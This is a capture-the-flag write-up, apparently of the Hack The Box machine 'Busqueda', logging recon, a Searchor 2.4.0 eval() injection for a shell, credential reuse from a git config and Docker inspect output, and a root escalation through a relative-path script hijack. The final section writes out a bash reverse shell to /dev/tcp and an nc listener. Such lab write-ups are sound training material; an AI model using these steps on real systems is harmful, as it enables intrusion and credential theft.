# Busqueda — Easy — Linux

**Date:** 12 June 2026

---

## Tags
`#linux` `#web` `#command-injection` `#searchor` `#git-config` `#gitea` `#sudo` `#relative-path` `#privesc`

---

## What I Know

| Item            | Detail                                                          |
| --------------- | -------------------------------------------------------------- |
| Target          | searcher.htb (10.129.228.217)                                  |
| OS              | Linux (Ubuntu)                                                 |
| Open ports      | 22 (SSH), 80 (HTTP)                                            |
| Services        | OpenSSH 8.9p1; Apache httpd 2.4.52                             |
| Web app         | Flask app using Searchor 2.4.0                                 |
| Initial user    | svc                                                           |
| Privesc chain   | git config creds → Gitea → sudo system-checkup.py → relative-path RCE |

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.228.217

Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-12 15:01 +0100
Nmap scan report for searcher.htb (10.129.228.217)
Host is up (0.025s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 17.08 seconds
```

<img width="961" height="320" alt="image" src="https://github.com/user-attachments/assets/181b9a2d-6c0f-4796-a777-205f3c44c4e1" />

```
nmap -sC -sV -p22,80 10.129.228.217

Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-12 15:04 +0100
Nmap scan report for 10.129.228.217
Host is up (0.015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.61 seconds
```

<img width="1228" height="469" alt="image" src="https://github.com/user-attachments/assets/9c0aaa1e-ca2d-4c89-9326-ed9902748981" />

**What each port tells me:**
- **Port 22 (SSH)** — OpenSSH 8.9p1 on Ubuntu. Open, but I have no credentials yet, so this is a target to come back to once I find some.
- **Port 80 (HTTP)** — Apache 2.4.52, redirecting to searcher.htb. This is my entry point, so I'll focus here first.

---

## Enumeration Log

```
OBSERVATION: Port 22 is open
WHAT IT TELLS ME: We can SSH into the server
WHAT I AM GOING TO TRY: Keep it aside
WHY: I don't have credentials
RESULT: N/A
WHAT NEXT: Investigate the next port (port 80)
```

```
OBSERVATION: Port 80 is open and nmap shows it redirects to searcher.htb
WHAT IT TELLS ME:
- I need to add searcher.htb domain to /etc/hosts to reach the site
- There could be additional vhosts
- I should browse and investigate the application
WHAT I AM GOING TO TRY:
- Add searcher.htb to /etc/hosts
- Fuzz for vhosts
- Navigate to the application and investigate it
WHY:
- So I can reach the site hosted at searcher.htb
- To discover any additional subdomains
- To understand the app and find an entry point
RESULT:
- The application loads search tool and the fotor shows that the application uses Searchor 2.4.0
- No additional vhost was found
WHAT NEXT:
- Research Searchor 2.4.0 for known vulnerabilities
- Exercise the app's functionality to see what it does
```

<img width="2069" height="678" alt="image" src="https://github.com/user-attachments/assets/2b94b5bf-c04b-4ba9-843b-9b2578613c0a" />

<img width="2153" height="1143" alt="image" src="https://github.com/user-attachments/assets/8d4b5388-0b58-4136-9f17-5cfb441e46cc" />

<img width="342" height="37" alt="image" src="https://github.com/user-attachments/assets/4d9cd3d5-f5f6-46dc-8105-f8abdffcc2a1" />


```
OBSERVATION: Searchor 2.4.0 has a known RCE vulnerability PoC at
https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-
WHAT IT TELLS ME: The app passes user input into an unsafe eval, so I can inject code
WHAT I AM GOING TO TRY: Use the exploit to get a reverse shell
WHY: It is a known vulnerability matching the exact version in use
RESULT: Got a reverse shell as user svc and read user.txt
WHAT NEXT: Enumerate the system for a privilege-escalation path
```

<img width="2107" height="648" alt="image" src="https://github.com/user-attachments/assets/393f3616-e820-49ed-982c-e68e82420fa4" />

<img width="823" height="225" alt="image" src="https://github.com/user-attachments/assets/7bd85155-cbee-4fc4-9106-7b648f50a71c" />

<img width="295" height="104" alt="image" src="https://github.com/user-attachments/assets/973e1eac-ddf2-4bbc-a4c2-3297e7cea6dd" />

```
OBSERVATION: As svc I found a hidden .git folder in the web app directory
WHAT IT TELLS ME:
- The .git folder may contain secrets (config, history)
- I still need a broader privesc vector
WHAT I AM GOING TO TRY:
- Inspect the files in .git
- Enumerate the system for environmental awareness
RESULT:
- .git/config contained credentials for the subdomain gitea.searcher.htb for user "cody"
- General system enumeration surfaced nothing immediately useful
WHAT NEXT:
- Add gitea.searcher.htb to /etc/hosts, browse it, and log in
- Try reusing the discovered password for svc over SSH so I can run sudo -l
```

<img width="1188" height="306" alt="image" src="https://github.com/user-attachments/assets/e1a181b2-1df4-4463-af48-0442355dcc29" />

<img width="2556" height="632" alt="image" src="https://github.com/user-attachments/assets/41d74ae6-9fef-4b78-9c40-7ef2e50f2fc6" />

<img width="2077" height="667" alt="image" src="https://github.com/user-attachments/assets/d3ae379c-100f-4d27-b282-2c5e7c75a47f" />

```
OBSERVATION:
- The cody credentials logged into Gitea at gitea.searcher.htb
- The same password let me SSH in as svc
- sudo -l shows svc may run, as root: /usr/bin/python3 /opt/scripts/system-checkup.py *
- There is another user, Administrator in gitea.searcher.htb
WHAT IT TELLS ME:
- system-checkup.py is a custom root script; understanding it may reveal a privesc route
- I should read it if possible, and run it as root to see its behaviour
WHAT I AM GOING TO TRY:
- Try to read /opt/scripts/system-checkup.py
- Run it via sudo to observe what it does
- Try reusing the password for the Administrator/root accounts
RESULT:
- I can't read system-checkup.py, it's root-only for read/edit
- Running it shows it inspects Docker containers on the system
- The password did not work for root on the system or for the Administrator web account
WHAT NEXT:
- Explore the script's allowed actions to see what I can do with it

```

<img width="745" height="281" alt="image" src="https://github.com/user-attachments/assets/2df5c845-27ef-4160-9093-fcec15d7afdc" />

<img width="911" height="164" alt="image" src="https://github.com/user-attachments/assets/035e588d-5d74-4ae3-a29a-8aef2c179cb1" />

```
OBSERVATION:
- The script's first action lists running Docker containers; the second inspects a specific container; the third action errored out
- Researching the inspect output, I had to pass the format parameter as "{{json .}}" to get JSON,
  then used https://jsonformatter.curiousconcept.com/# to read it clearly
- The inspected container exposed another set of credentials
WHAT IT TELLS ME:
- These creds may grant root on the system and/or the Administrator web account
- The third action is failing for a reason I need to understand
WHAT I AM GOING TO TRY:
- Reuse the recovered password against root and the web application
RESULT:
- The creds logged into the web application as Administrator, but did NOT give system root
- Administrator's Gitea repos are the same scripts found in /opt/scripts/
WHAT NEXT:
- Check whether I can modify the scripts
- Read the script source to understand exactly what it does
```

<img width="1965" height="141" alt="image" src="https://github.com/user-attachments/assets/5ed432f6-218e-47ed-89d6-aa18cb3f5270" />

<img width="2535" height="860" alt="image" src="https://github.com/user-attachments/assets/4eacc3c1-6631-4b53-938e-27813713439b" />

<img width="1053" height="59" alt="image" src="https://github.com/user-attachments/assets/306a8889-3f78-4313-98ea-0cb52dc86051" />

<img width="1206" height="427" alt="image" src="https://github.com/user-attachments/assets/4af6639f-f24f-40b0-8ac7-7267169d0a78" />

<img width="1893" height="651" alt="image" src="https://github.com/user-attachments/assets/7a0bab85-257d-4a83-926d-5f12378d8fa7" /> 

```
OBSERVATION:
- Reading system-checkup.py in Gitea (as Administrator) showed the third action invokes ./full-checkup.sh
  using a RELATIVE path, so that file must exist in the current working directory or the action errors
- I confirmed this by cd'ing to a writable directory and running the third action: it now executed full-checkup.sh
WHAT IT TELLS ME:
- The script runs as root via sudo and calls full-checkup.sh by relative path
- If I drop my own full-checkup.sh in my current directory and trigger the third action, it runs as root
WHAT I AM GOING TO TRY:
- Create a malicious full-checkup.sh (reverse shell from
  https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#bash-tcp),
  make it executable, then run the third action from that directory
RESULT:
- Got a reverse shell as root and read root.txt
```

<img width="1253" height="453" alt="image" src="https://github.com/user-attachments/assets/b69dc049-d768-40c3-abdb-88f64ec31c7c" />

<img width="580" height="220" alt="image" src="https://github.com/user-attachments/assets/b9ed8b23-46c7-4333-a4e9-d8a65010ce2e" />

<img width="1688" height="883" alt="image" src="https://github.com/user-attachments/assets/3b9b4ff7-1abe-4579-a318-9cfbcd3b88ff" />

<img width="507" height="52" alt="image" src="https://github.com/user-attachments/assets/7a78fbf6-53ab-41d2-a664-b830a4427d44" />

<img width="551" height="78" alt="image" src="https://github.com/user-attachments/assets/25c1da93-52d3-4eb3-ab02-551cd5579243" />

<img width="1083" height="55" alt="image" src="https://github.com/user-attachments/assets/e418e285-57a1-4c22-938b-c8f7f0c8e3a9" />
<img width="813" height="319" alt="image" src="https://github.com/user-attachments/assets/a28fac93-06f9-442d-8834-652fcc979ee3" /> 
</br>

---

## Foothold

**How I got in:** The site at searcher.htb is a Flask front-end built on **Searchor 2.4.0**, which has a known remote code execution flaw it passes user-supplied input into an `eval()` when building the search URL, so crafted input is executed as Python. Using the public PoC against the search functionality returned a reverse shell as the **svc** user.

**Command / exploit used:**
```
echo "10.129.228.217  searcher.htb gitea.searcher.htb" | sudo tee -a /etc/hosts
git clone https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-
# run the PoC against http://searcher.htb/ with a listener ready
nc -lnvp <LPORT>          # → shell as svc
```

**Why it worked:** Searchor 2.4.0 builds its query by concatenating user input into a string that is then `eval`'d. Because nothing sanitises that input, injecting a Python payload breaks out of the intended expression and runs arbitrary code in the app's context.

---

## Privilege Escalation

**Path taken (svc → root)** — a four-link chain:

1. **Git config leak.** In the web app directory, `.git/config` held credentials for **cody** on the internal Gitea instance (`gitea.searcher.htb`). The same password worked for the **svc** system account over SSH.
2. **Sudo discovery.** `sudo -l` showed svc could run `/usr/bin/python3 /opt/scripts/system-checkup.py *` as root. The script was unreadable (root-only) but runnable; its actions inspect Docker containers.
3. **Creds from a container.** Using the script's `docker-inspect` action (with `--format "{{json .}}"`) dumped a container's config, which exposed the **Administrator** Gitea password. That logged into Gitea as Administrator where the `system-checkup.py` source lives in a repo.
4. **Relative-path hijack.** Reading the source revealed the `full-checkup` action runs `./full-checkup.sh` by **relative path**. Since the script executes as root via sudo, I placed a malicious `full-checkup.sh` (a bash reverse shell) in a writable directory, made it executable, and ran the action from there  root executed my script, giving a root shell.

```
# step 4
cd /tmp
cat full-checkup.sh 
#!/bin/bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
chmod +x full-checkup.sh
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup   # → root shell
```

**Why it worked:** Two compounding misconfigurations. First, secrets were committed/stored where a lower-privileged user could read them (the git config and the Docker container config), letting me pivot account to account. Second, a root-run script invoked a helper script by **relative path** rather than an absolute one, so whoever controls the working directory controls what root executes. Combined with the sudo grant, that relative-path reference is the actual root vector.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Exploited a known `eval()`-based RCE in Searchor 2.4.0 via the web app's search input to get a shell as svc.
2. **Privesc technique in one sentence:** Chained leaked git-config creds → Gitea login → a sudo-runnable Docker-inspection script that leaked Administrator creds → abuse of a relative-path call (`./full-checkup.sh`) in that root script to execute my own reverse shell as root.
